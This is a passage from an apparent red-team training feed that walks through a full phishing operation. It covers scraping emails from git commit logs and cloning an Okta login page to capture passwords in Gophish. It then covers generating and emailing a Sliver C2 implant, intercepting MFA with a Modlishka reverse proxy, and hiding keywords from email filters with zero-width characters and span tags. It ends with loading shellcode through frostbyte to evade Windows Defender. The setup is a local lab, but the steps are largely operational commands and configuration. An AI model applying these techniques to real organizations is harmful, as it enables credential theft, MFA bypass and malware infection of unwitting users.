&lt;h4 id="cons-1"&gt;Cons&lt;a class="td-heading-self-link" href="#cons-1" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Outdated.&lt;/li&gt;
&lt;li&gt;Lots of data.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id="source-control"&gt;Source Control&lt;a class="td-heading-self-link" href="#source-control" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;
&lt;h4 id="pros-2"&gt;Pros&lt;a class="td-heading-self-link" href="#pros-2" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Easy to get.&lt;/li&gt;
&lt;li&gt;Commit dates give an idea at how recently the information was valid.&lt;/li&gt;
&lt;li&gt;Also acquire personal emails.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id="cons-2"&gt;Cons&lt;a class="td-heading-self-link" href="#cons-2" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Sometimes lots of repos.&lt;/li&gt;
&lt;li&gt;Probably more.&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>Target Acquisition: Git</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/32-target-aquistion-git/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/32-target-aquistion-git/</guid><description>&lt;p&gt;Go to GitHub and see what we can find. Open &lt;a href="https://github.com/snakshare"&gt;https://github.com/snakshare&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mkdir -p ~/Desktop/op/code/github.com/snakshare
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~/Desktop/op/code/github.com/snakshare
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;git clone https://github.com/SnakShare/snakshare.github.io.git
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we can get a list of users and email addresses.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;git log --pretty&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;format:%aN, %ae%n%cN, %ce&amp;#34;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sort -u &lt;span class="p"&gt;|&lt;/span&gt; tee ~/Desktop/op/git-users.csv
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>Basic Credential Harvesting</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/35-basic-cred-harvest/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/35-basic-cred-harvest/</guid><description>&lt;h2 id="create-a-new-landing-page"&gt;Create a new landing page.&lt;a class="td-heading-self-link" href="#create-a-new-landing-page" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;open &lt;a href="https://someplace.okta.com/"&gt;https://someplace.okta.com/&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;open dev console (f12)&lt;/li&gt;
&lt;li&gt;in console run:&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-js" data-lang="js"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;getElementsByTagName&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;script&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;].&lt;/span&gt;&lt;span class="nx"&gt;parentNode&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;removeChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;s&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;])}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/basic-cred-harvest-landing-page-dev-console.png" alt="Basic Credential Harvesting Landing Page"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;right click web page &amp;gt; inspect element.&lt;/li&gt;
&lt;li&gt;find top HTML tag.&lt;/li&gt;
&lt;li&gt;right click &amp;gt; copy &amp;gt; outer HTML.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/basic-cred-harvest-landing-page-html-copy-outer-html.png" alt="Copy Outer HTML"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;paste HTML in landing page.&lt;/li&gt;
&lt;li&gt;check capture data.&lt;/li&gt;
&lt;li&gt;check capture password.&lt;/li&gt;
&lt;li&gt;set redirect to &lt;a href="https://www.okta.com/404.html"&gt;https://www.okta.com/404.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/gophish-landing-page-creation.png" alt="Gophish Landing Page"&gt;&lt;/p&gt;

&lt;h2 id="create-a-new-email-template"&gt;Create a new email template&lt;a class="td-heading-self-link" href="#create-a-new-email-template" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Be sure to include &lt;code&gt;{{.URL}}&lt;/code&gt; &lt;a href="https://docs.getgophish.com/user-guide/template-reference"&gt;ref&lt;/a&gt;&lt;/p&gt;</description></item><item><title>State Review I</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/40-state-review-1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/40-state-review-1/</guid><description>&lt;p&gt;This current setup would allow you to do basic credential harvesting phishing campaigns. Which may work on some organizations. However, Many modern organizations usually have additional protections. The following protections are standard security practices:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Require MFA.&lt;/li&gt;
&lt;li&gt;Email filtering (though most services provide a basic filter).&lt;/li&gt;
&lt;li&gt;Email link protections (fancy bots to analyze link content before allowing users to visit the URL).&lt;/li&gt;
&lt;li&gt;Domain monitoring (Certificate transparency logs for look alike domains).&lt;/li&gt;
&lt;li&gt;Endpoint Protections.&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>Implant Setup With Sliver</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/45-implant-setup/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/45-implant-setup/</guid><description>&lt;h3 id="basic-payload-delivery-sliver"&gt;Basic Payload Delivery: Sliver&lt;a class="td-heading-self-link" href="#basic-payload-delivery-sliver" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Sliver is an open source C2&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/BishopFox/sliver/wiki/Getting-Started"&gt;https://github.com/BishopFox/sliver/wiki/Getting-Started&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/BishopFox/sliver/releases"&gt;https://github.com/BishopFox/sliver/releases&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Download the latest release and put in your &lt;code&gt;$PATH&lt;/code&gt;. We should already have our dependencies installed when we set up the infrastructure.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mkdir ~/bin
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wget -O ~/bin/sliver-server_linux https://github.com/BishopFox/sliver/releases/download/v1.5.41/sliver-server_linux
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;chmod +x ~/bin/sliver-server_linux
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description></item><item><title>Sliver: Generating an implant</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/50-generating-sliver-implant/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/50-generating-sliver-implant/</guid><description>&lt;h3 id="generate-a-new-implant"&gt;Generate a new implant&lt;a class="td-heading-self-link" href="#generate-a-new-implant" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mkdir -p ~/Desktop/op/sliver/implants
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~/Desktop/op/sliver
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sliver-server_linux
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We should now be in a &lt;code&gt;sliver&lt;/code&gt; shell.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/sliver-shell.png" alt="Sliver Shell"&gt;&lt;/p&gt;
&lt;p&gt;Now we can generate a test implant:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;generate --mtls 127.0.0.1 --save implants/default-sliver.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id="testing-implant"&gt;Testing implant&lt;a class="td-heading-self-link" href="#testing-implant" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In the sliver shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mtls
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In a new terminal window:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;wine ~/Desktop/op/sliver/implants/default-sliver.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/sliver-implant-test.png" alt="Sliver Implant Test"&gt;&lt;/p&gt;
&lt;p&gt;Now we can use the implant by calling &lt;code&gt;use [session id]&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/sliver-implant-use.png" alt="Sliver Implant Usage"&gt;&lt;/p&gt;</description></item><item><title>Basic Implant Delivery</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/55-basic-implant-delivery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/55-basic-implant-delivery/</guid><description>&lt;ul&gt;
&lt;li&gt;Copy first template.
&lt;img src="https://defektive.github.io/static/how-to-phishing/copy-email-template.png" alt="Copy Email Template"&gt;&lt;/li&gt;
&lt;li&gt;Add file attachment.&lt;/li&gt;
&lt;li&gt;Update words.&lt;/li&gt;
&lt;li&gt;Create new Campaign that uses the above.
&lt;ul&gt;
&lt;li&gt;The landing page can stay the same, it is actually not used since we removed it from the template.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;wait for the email to send&amp;hellip;
&lt;ul&gt;
&lt;li&gt;The default sliver executable is ~15MB so it may take sometime for it to send&amp;hellip;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/second-campaign-inbox.png" alt="Second Campaign Inbox"&gt;&lt;/p&gt;
&lt;p&gt;You can find the attachment under the MIME tab.
&lt;img src="https://defektive.github.io/static/how-to-phishing/mailhog-sliver-email-attachment-download.png" alt="Sliver Attachment"&gt;&lt;/p&gt;</description></item><item><title>State Review II</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/60-state-review-ii/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/60-state-review-ii/</guid><description>&lt;h3 id="how-can-we-make-this-better"&gt;How can we make this better?&lt;a class="td-heading-self-link" href="#how-can-we-make-this-better" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We need:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Intercept MFA requests. We are already tricking the user to visiting our site, so this is easier than it sounds.&lt;/li&gt;
&lt;li&gt;Use invisible HTML tags to bypass email filtering.&lt;/li&gt;
&lt;li&gt;Detect bots and show them benign pages.&lt;/li&gt;
&lt;li&gt;Ensure our domains do not match the target or prominent service provider.&lt;/li&gt;
&lt;li&gt;Obfuscate payloads to bypass EDR protections.&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>Modlishka</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/65-modlishka/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/65-modlishka/</guid><description>&lt;h3 id="modlishka"&gt;Modlishka&lt;a class="td-heading-self-link" href="#modlishka" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Modlishka is an amazing tool that can mirror a website on the fly, rewriting links to ensure the site functions. This allows us to essentially MitM connections to our targeted service from a domain we control.&lt;/p&gt;
&lt;p&gt;Checkout of Modlishka and get things setup to be run in docker.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mkdir ~/Desktop/op/docker/modlishka
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~/Desktop/op/docker/modlishka
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mkdir modlishka-data
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;touch modlishka-data/config.json
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;git clone https://github.com/Stage2Sec/Modlishka.git
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; Modlishka
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;cp extra/docker/* .
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Modlishka can take command line arguments or a configuration file. We are opting to use the configuration file. Add the following to &lt;code&gt;~/Desktop/op/docker/modlishka/modlishka-data/config.json&lt;/code&gt;&lt;/p&gt;</description></item><item><title>Setup MFA Authentication Provider</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/70-modlishka-sso/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/70-modlishka-sso/</guid><description>&lt;blockquote&gt;
&lt;p&gt;If attending a live training, skip this section&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Now that we have Modlishka up and running. Let&amp;rsquo;s get it configured with a target login provider. We&amp;rsquo;ll use Authentik to get an Okta like experience.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;mkdir ~/Desktop/op/docker/authentik
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; ~/Desktop/op/docker/
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;PG_PASS=dumbpassword&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; .env
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;AUTHENTIK_SECRET_KEY=supersecretkeythatpaullikes&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; .env
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;AUTHENTIK_ERROR_REPORTING__ENABLED=true&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; .env
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Add the follow for emails&amp;hellip;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-sh" data-lang="sh"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# SMTP Host Emails are sent to&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;AUTHENTIK_EMAIL__HOST&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;mailhog
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;AUTHENTIK_EMAIL__PORT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1025&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Optionally authenticate (don&amp;#39;t add quotation marks to your password)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;AUTHENTIK_EMAIL__USERNAME&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;AUTHENTIK_EMAIL__PASSWORD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Use StartTLS&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;AUTHENTIK_EMAIL__USE_TLS&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Use SSL&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;AUTHENTIK_EMAIL__USE_SSL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;false&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;AUTHENTIK_EMAIL__TIMEOUT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# Email address authentik will send from, should have a correct @domain&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="nv"&gt;AUTHENTIK_EMAIL__FROM&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;authentik@target.docker
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we&amp;rsquo;ll merge their &lt;code&gt;docker-compose.yml&lt;/code&gt; with ours (&lt;a href="https://goauthentik.io/docs/installation/docker-compose"&gt;ref&lt;/a&gt;). We&amp;rsquo;ll start with the services.&lt;/p&gt;</description></item><item><title>Reconfigure Modlishka With MFA Authentication Provider</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/75-reconfigure-modlishka/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/75-reconfigure-modlishka/</guid><description>&lt;p&gt;Let&amp;rsquo;s go through the authentication flow to determine what the username and password fields when conducting a normal login. First thing we want to do is open developer tools and ensure &lt;code&gt;Persist Logs&lt;/code&gt; is checked.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/authentik-devtools-persist-logs.png" alt="Persist Logs"&gt;&lt;/p&gt;
&lt;p&gt;Now we can fill out the username field, press login, then look for the POST request.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/authentik-username-post-request.png" alt="Username Request"&gt;&lt;/p&gt;
&lt;p&gt;Fill out our password and do the same.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/authentik-password-post-request.png" alt="Password Request"&gt;&lt;/p&gt;
&lt;p&gt;We can see that the fields are &lt;code&gt;uid_field&lt;/code&gt; and &lt;code&gt;password&lt;/code&gt;.&lt;/p&gt;</description></item><item><title>Test Modlishka MFA Bypass</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/80-testing-modlishka-mfa-bypass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/80-testing-modlishka-mfa-bypass/</guid><description>&lt;p&gt;Open up a new private browsing window, then visit &lt;a href="http://modlishka.docker/?rid=test0001"&gt;http://modlishka.docker/?rid=test0001&lt;/a&gt;. We&amp;rsquo;ll make up a fake &lt;code&gt;rid&lt;/code&gt; value to help us track our progress.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/modlishka-mfa-landing.png" alt="Modlishka MFA Login"&gt;&lt;/p&gt;
&lt;p&gt;Go through the authentication flow. You can Modlishka seamlessly handles the redirects and the MFA authentication flow.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/modlishka-auth-mfa-prompt.png" alt="Modlishka MFA Prompt"&gt;&lt;/p&gt;
&lt;p&gt;So we are stuck at a loading screen. this is because we hit the terminate trigger URL while loading a page.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/modlishka-auth-success-loader.png" alt="Modlishka Authentication Loading"&gt;&lt;/p&gt;
&lt;p&gt;If we refresh the page we&amp;rsquo;ll get redirected to our termination URL. Kind of jarring, but still acceptable.&lt;/p&gt;</description></item><item><title>Not So Basic Credential Harvesting</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/85-not-so-basic-phishing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/85-not-so-basic-phishing/</guid><description>&lt;p&gt;Now we can go back to Gophish, clone our first credential harvesting campaign, modify the URL to point to Modlishka (&lt;a href="http://modlishka.docker"&gt;http://modlishka.docker&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/not-so-basic-cred-harvesting-campaign.png" alt="Gophish Campaign with MFA"&gt;&lt;/p&gt;
&lt;p&gt;This will break Gophish&amp;rsquo;s Opened, Clicked, and Data Captured analytics. We can fix those later, but for now we&amp;rsquo;ll just keep moving forward.&lt;/p&gt;
&lt;p&gt;&lt;img src="https://defektive.github.io/static/how-to-phishing/mailhog-mfa-campaign.png" alt="MailHog MFA Campaign"&gt;&lt;/p&gt;
&lt;p&gt;If we click on it, we can see in our Modlishka livewell page, we can see our target&amp;rsquo;s RID.&lt;/p&gt;</description></item><item><title>Email Filtering Bypass</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/100-email-filtering-bypass/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/100-email-filtering-bypass/</guid><description>&lt;h3 id="bypassing-email-filtering"&gt;Bypassing Email Filtering&lt;a class="td-heading-self-link" href="#bypassing-email-filtering" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;A lot of times emails will be quarantined based on content. We can trick them by injecting invisible characters and html elements into our messages.&lt;/p&gt;
&lt;p&gt;We can use a Zero Width Joiner &lt;a href="https://emojipedia.org/zero-width-joiner/"&gt;ref&lt;/a&gt; to assist in this. simply pasting the character in the middle of problematic words should do the trick.&lt;/p&gt;
&lt;p&gt;We can also use the &lt;code&gt;&amp;lt;span&amp;gt;&lt;/code&gt; HTML element to help us out by breaking up problematic words and phrases.&lt;/p&gt;</description></item><item><title>Modlishka Terminate to Implant Download</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/105-terminate-to-implant-download/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/105-terminate-to-implant-download/</guid><description>&lt;h3 id="terminate-to-implant-download"&gt;Terminate to implant download&lt;a class="td-heading-self-link" href="#terminate-to-implant-download" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;We can set our terminationURL to a place where we are hosting our windows implant. This will require them to authenticate then be redirected to a file download page.&lt;/p&gt;
&lt;p&gt;Add our newly generated payload to the NGINX container.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Create a landing page html to be our termination URL. We can use this to execute some js to make sure the target is running windows before we download the file.&lt;/p&gt;</description></item><item><title>Better Payload Generation</title><link>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/110-better-payload/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://defektive.github.io/docs/phishing-credential-harvesting-and-beyond/110-better-payload/</guid><description>&lt;h3 id="better-implants-frostbyte-bypass-windows-defender"&gt;Better implants (frostbyte bypass windows defender)&lt;a class="td-heading-self-link" href="#better-implants-frostbyte-bypass-windows-defender" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Instead of generating an executable. We can generate shellcode. We can then use something like &lt;a href="https://github.com/pwn1sher/frostbyte"&gt;https://github.com/pwn1sher/frostbyte&lt;/a&gt; to load that shellcode into memory and execute it.&lt;/p&gt;

&lt;h3 id="get-frostbyte"&gt;Get frostbyte&lt;a class="td-heading-self-link" href="#get-frostbyte" aria-label="Heading self-link"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Download the &lt;a href="https://github.com/pwn1sher/frostbyte/archive/refs/heads/main.zip"&gt;frostbyte zip&lt;/a&gt; from GitHub.&lt;/p&gt;

